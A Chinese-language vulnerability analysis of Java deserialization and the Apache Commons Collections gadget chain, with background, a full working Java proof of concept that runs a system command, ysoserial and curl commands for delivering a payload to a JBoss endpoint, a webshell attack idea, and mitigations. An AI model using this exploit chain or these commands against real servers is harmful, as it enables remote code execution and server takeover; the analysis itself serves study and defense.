# 前言

在2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客里，借用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例来到人们的视野，各大Java Web Server纷纷躺枪，这个漏洞横扫WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。而在将近10个月前， Gabriel Lawrence 和Chris Frohoff 就已经在AppSecCali上的一个报告里提到了这个漏洞利用思路。

目前，针对这个"2015年最被低估"的漏洞，各大受影响的Java应用厂商陆续发布了修复后的版本，Apache Commons Collections项目也对存在漏洞的类库进行了一定的安全处理。但是网络上仍有大量网站受此漏洞影响。

# java反序列化概念

序列化就是把对象的状态信息转换为字节序列\(即可以存储或传输的形式\)过程  
　　反序列化即逆过程，由字节流还原成对象  
　　注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。

**用途：**

1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；  
　　2） 在网络上传送对象的字节序列。

**应用场景：**

1\) 一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。

2\) 在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。

比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。

例子： 淘宝每年都会有定时抢购的活动，很多用户会提前登录等待，长时间不进行操作，一致保存在内存中，而到达指定时刻，几十万用户并发访问，就可能会有几十万个session，内存可能吃不消。这时就需要进行对象的活化、钝化，让其在闲置的时候离开内存，将信息保存至硬盘，等要用的时候，就重新加载进内存。

    Java中的`ObjectOutputStream`类的`writeObject()`方法可以实现序列化，类`ObjectInputStream`类的`readObject()`

方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复的样例代码：![](/assets/apache-java1.png)**序列号之后的数据解析**

数据开头为“AC ED 00 05”，数据内容包含了包名与类名、类中包含的变量名称、类型及变量的值。![](/assets/apache-java2.png)这里需要注意的是，`ac ed 00 05`是java序列化内容的特征，如果经过base64编码，那么相对应的是`rO0AB`：

![](/assets/apache-java3.png)

# 反序列化漏洞原理

Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。

所以这个问题的根源在于类`ObjectInputStream`在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。

# Apache Commons Collections反序列化漏洞分析

Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。。

org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为\*\*set，list，queue\*\*等等，它们是\*\*集合类型\*\*。换一种理解方式，collection是set，list，queue的抽象。

```

```

![](/assets/apache-java4.png)

作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。

在Apache Commons Collections中有一个InvokerTransformer类实现了Transformer，主要作用是调用Java的反射机制\\(反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性，详细内容请参考：\[[http://ifeve.com/java-reflection/\\)\]\(http://ifeve.com/java-reflection/\)](http://ifeve.com/java-reflection/%29]%28http://ifeve.com/java-reflection/%29来调用任意函数，只需要传入方法名、参数类型和参数，即可调用任意函数。TransformedMap配合sun.reflect.annotation.AnnotationInvocationHandler中的readObject%28%29，可以触发漏洞。我们先来看一下大概的逻辑：)

来调用任意函数，只需要传入方法名、参数类型和参数，即可调用任意函数。TransformedMap配合sun.reflect.annotation.AnnotationInvocationHandler中的readObject\\(\\)，可以触发漏洞。我们先来看一下大概的逻辑：

```markdown

```

![](/assets/apache-java5.png)

先给一下POC

```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
public class test3 {
    public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        GeneratePayload(Reverse_Payload(),"obj");
        payloadTest("obj");
    }
    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```

我们先来看一下Transformer接口，该接口仅定义了方法transform\(Object input\)：

![](/assets/apache-java6.png)

我们可以看到该方法的作用是：给定一个Object对象经过转换后也返回一个Object，该PoC中利用的是三个实现类：`ChainedTransformer`，`ConstantTransformer`，`InvokerTransformer`

首先看InvokerTransformer类中的transform\(\)方法：  
![](/assets/apache-java7.png)

![](/assets/apache-java8.png)

我们可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象\(反射机制就是可以把一个类,类的成员\(函数,属性\),当成一个对象来操作,希望读者能理解,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们.\)，iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型，iArgs为对应方法的参数，在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数

接下来我们看一下ConstantTransformer类的transform\(\)方法：

![](/assets/apache-java9.png)

该方法很简单，就是返回iConstant属性，该属性也为可控参数：

最后一个ChainedTransformer类很关键，我们先看一下它的构造函数：

![](/assets/apache-java10.png)

我们可以看出它传入的是一个Transformer数组，接下来看一下它的transform\(\)方法：

![](/assets/apache-java11.png)

这里使用了for循环来调用Transformer数组的transform\(\)方法，并且使用了object作为后一个调用transform\(\)方法的参数，结合PoC来看：

```
public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
```

我们构造了一个Transformer数组transformers，第一个参数是“new ConstantTransformer\(Runtime.class\)”，后续均为InvokerTransformer对象，最后用该Transformer数组实例化了transformerChain对象，如果该对象触发了transform\(\)函数,那么transformers将在内一次展开触发各自的transform\(\)方法，由于InvokerTransformer类的特性，可以通过反射触发漏洞。下图是触发后debug截图：

![](/assets/apache-java12.png)

iTransformers\[0\]是ConstantTransformer对象，返回的就是Runtime.class类对象，再此处object也就被赋值为Runtime.class类对象，传入iTransformers\[2\].transform\(\)方法：

![](/assets/apache-java13.png)

然后依次类推：

![](/assets/apache-java14.png)

最后：

![](/assets/apache-java15.png)

这里就会执行“open /Applications/Calculator.app”命令。

但是我们无法直接利用此问题，但假设存在漏洞的服务器存在反序列化接口，我们可以通过反序列化来达到目的。

可以看出，关键是需要构造包含命令的ChainedTransformer对象，然后需要触发ChainedTransformer对象的transform\(\)方法，即可实现目的。在TransformedMap中的checkSetValue\(\)方法中，我们发现：

![](/assets/apache-java16.png)

_**该方法会触发ChainedTransformer对象的transform\(\)方法**_，那么我们的思路就比较清晰了，我们可以首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap，然后想办法去触发Map中的MapEntry产生修改（例如setValue\(\)函数），即可触发我们构造的Transformer，因此也就有了PoC中的一下代码：

```
Map innermap = new HashMap();
innermap.put("value", "value");
Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
```

```
TransformedMap.decorate()方法是获得一个TransformedMap的实例

TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。

    第一个参数为待转化的Map对象
    第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
    第三个参数为Map对象内的value要经过的转化方法
```

```
TransformedMap.decorate(innermap, null, transformerChain);这个表明outmap这个Transformed对象要执行transformerChain的方法
```

这里的outmap是已经构造好的TransformedMap，现在我们的目的是需要能让服务器端反序列化某对象时，触发outmap的checkSetValue\(\)函数。

这时类AnnotationInvocationHandler登场了，这个类有一个成员变量memberValues是Map类型，如下所示：  
![](/assets/apache-java17.png)

AnnotationInvocationHandler的readObject\(\)函数中对memberValues的每一项调用了setValue\(\)函数，如下所示：![](/assets/apache-java18.png)**因为setValue\(\)函数最终会触发checkSetValue\(\)函数：**

![](/assets/apache-java-21.png)

因此我们只需要使用前面构造的outmap来构造AnnotationInvocationHandler，进行序列化，当触发readObject\(\)反序列化的时候，就能实现命令执行：

![](/assets/apache-java20.png)

接下来就只需要序列化该对象：

![](/assets/apache-java21.png)

当反序列化该对象，触发readObject\(\)方法，就会导致命令执行：

![](/assets/apache-java22.png)

Server端接收到恶意请求后的处理流程：![](/assets/apache-common反序列化.jpg)最终POP链执行过程

```
Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                AbstractInputCheckedMapDecorator$MapEntry.setValue()
                    TransformedMap.checkSetValue()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Class.getMethod()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.getRuntime()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
```

# 漏洞挖掘

**1.漏洞触发场景**

在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：

1. HTTP请求中的参数，cookies以及Parameters。
2. RMI协议，被广泛使用的RMI协议完全基于序列化
3. JMX 同样用于处理序列化对象
4. 自定义协议用来接收与发送原始的java对象

**2. 漏洞挖掘**

\(1\)确定反序列化输入点

首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：

1\)源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。

2\)对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等

注： java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。

\(2\)再考察应用的Class Path中是否包含Apache Commons Collections库

\(3\)生成反序列化的payload

\(4\)提交我们的payload数据

# 漏洞测试

```
搜索匹配"readObject"靶点
　　 grep -nr "readObject" *
测试是否含该漏洞的jar包文件
    grep -R InvokerTransformer
生成序列化payload数据
    java -jar ysoserial-0.0.4-all.jar CommonsCollections1 '想要执行的命令' > payload.out
提交payload数据
　　curl --header 'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue' --data-binary '@payload.out' http://ip:8080/invoker/JMXInvokerServlet
```

```
exploit例子
java -jar  ysoserial-0.0.2-all.jar   CommonsCollections1  'echo 1 > /tmp/pwned'  >  payload
curl --header 'Content-Type: application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue' --data-binary '@/tmp/payload' http://127.0.0.1:8080/invoker/JMXInvokerServlet
```

```
工具获取方法

去github上下载jar发行版：https://github.com/frohoff/ysoserial/releases
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar

或者自行编译：
git　clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -DskipTests
```

# **影响及修复**

受影响的通用库和框架

1. Spring Framework &lt;= 3.0.5，&lt;= 2.0.6；
2. Groovy &lt; 2.4.4；
3. Apache Commons Collections &lt;= 3.2.1，&lt;= 4.0.0；
4. More to come ...

漏洞的根源是对数据反序列化的时候没有检查对数据进行安全检查和未检测反序列化对象安全性造成的。所以修复方案如下：

以下是两种比较常用的防范反序列化安全问题的方法：

**1.类白名单校验**

在ObjectInputStream 中resolveClass 里只是进行了class 是否能被load，自定义ObjectInputStream, 重载resolveClass的方法，对className 进行白名单校验

```
public final class test extends ObjectInputStream{
    ...
    protected Class<?>resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException{
         if(!desc.getName().equals("className")){
            throw new ClassNotFoundException(desc.getName()+" forbidden!");
        }
        returnsuper.resolveClass(desc);
    }
      ...
}
```

**2.禁止JVM执行外部命令Runtime.exec**

通过扩展SecurityManager可以实现:

```
SecurityManager originalSecurityManager = System.getSecurityManager();
        if (originalSecurityManager == null) {
            // 创建自己的SecurityManager
            SecurityManager sm = new SecurityManager() {
                private void check(Permission perm) {
                    // 禁止exec
                    if (perm instanceof java.io.FilePermission) {
                        String actions = perm.getActions();
                        if (actions != null &&actions.contains("execute")) {
                            throw new SecurityException("execute denied!");
                        }
                    }
                    // 禁止设置新的SecurityManager，保护自己
                    if (perm instanceof java.lang.RuntimePermission) {
                        String name = perm.getName();
                        if (name != null &&name.contains("setSecurityManager")) {
                            throw new SecurityException("System.setSecurityManager denied!");
                        }
                    }
                }
                @Override
                public void checkPermission(Permission perm) {
                    check(perm);
                }

                @Override
                public void checkPermission(Permission perm, Object context) {
                    check(perm);
                }
            };
            System.setSecurityManager(sm);
        }
```

Java反序列化大多存在复杂系统间相互调用，控制，或较为底层的服务应用间交互等应用场景上，因此接口本身可能就存在一定的安全隐患。Java反序列化本身没有错，而是面对不安全的数据时，缺乏相应的防范，导致了一些安全问题。并且不容忽视的是，也许某些Java服务没有直接使用存在漏洞的Java库，但只要Lib中存在存在漏洞的Java库，依然可能会受到威胁。

**  
3、更新更新Apache Commons Collections库**

```
    Apache Commons Collections在3.2.2版本开始做了一定的安全处理，新版本的修复方案对相关反射调用进行了限制，对这些不安全的Java类的序列化支持增加了开关。
```

# 总结

漏洞分析

```
    1.引发：如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。

    2.原因: 类ObjectInputStream在反序列化时，没有对生成的对象的输入做限制，使攻击者利用反射调用函数进行任意命令执行。CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法
    
    3.根源：Apache Commons Collections允许链式的任意的类函数反射调用
    
    4.问题函数：org.apache.commons.collections.Transformer接口
    
    5.利用：要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码。
    
    6.思路：攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。
     至于如何使用这个漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化，
     将序列化后的二进制流发送给有这个漏洞的服务器，服务器会反序列化该数据的并生成一个webshell文件，然后就可以直接访问这个生成的webshell文件进行进一步利用。
```





参考资料：

[https://www.vulbox.com/knowledge/detail/?id=11](https://www.vulbox.com/knowledge/detail/?id=11)

[https://xz.aliyun.com/t/1825](https://xz.aliyun.com/t/1825)

[https://xz.aliyun.com/t/136\#toc-1](https://xz.aliyun.com/t/136#toc-1)

[https://blog.chaitin.cn/2015-11-11\_java\_unserialize\_rce/?from=timeline&isappinstalled=0\#h2\_java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/?from=timeline&isappinstalled=0#h2_java反序列化漏洞简介)

[https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/](https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/)

